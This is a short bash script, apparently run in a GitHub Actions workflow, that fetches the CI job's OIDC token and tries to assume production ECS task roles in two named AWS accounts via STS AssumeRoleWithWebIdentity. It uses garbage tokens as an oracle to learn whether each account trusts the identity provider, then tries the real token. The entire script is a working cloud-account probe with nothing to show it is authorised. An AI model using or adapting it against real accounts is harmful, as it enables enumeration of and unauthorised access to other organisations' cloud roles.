#!/usr/bin/env bash
set -u
echo "=================== BEGIN OIDC PROBE 222362 RUN3 (diagnostics) ==================="
echo "repository: ${GITHUB_REPOSITORY:-?} ref: ${GITHUB_REF:-?}"
J1=$(curl -s -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
[ -n "$J1" ] && echo "real JWT obtained, len=${#J1}"
raw() {
  R="$1"; J="$2"; TAG="$3"
  echo "----- RAW [$TAG] role=$R token=${4:-real}"
  curl -s -m 25 -X POST https://sts.amazonaws.com/ \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=$R" \
    --data-urlencode "RoleSessionName=cgprobe222362" \
    --data-urlencode "WebIdentityToken=$J" \
    --data-urlencode "DurationSeconds=900" -w "\nhttp:%{http_code}\n" | grep -E "Code>|Message>|http:|No OpenIDConnect"
  sleep 1
}
echo "### diagnostic A: garbage token @ 602675409103 (provider-existence oracle)"
raw "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod" "not.a.jwt" G1-602 garb
echo "### diagnostic B: garbage token @ 533852667875"
raw "arn:aws:iam::533852667875:role/cg-core-ecs-tasks-role-prod" "not.a.jwt" G2-533 garb
echo "### control: real token @ 533852667875 (known AccessDenied) vs @ 602675409103 (known InvalidIdentityToken)"
raw "arn:aws:iam::533852667875:role/cg-core-ecs-tasks-role-prod" "$J1" C1-533 real
raw "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod" "$J1" C2-602 real
echo "=================== END OIDC PROBE RUN3 ==================="
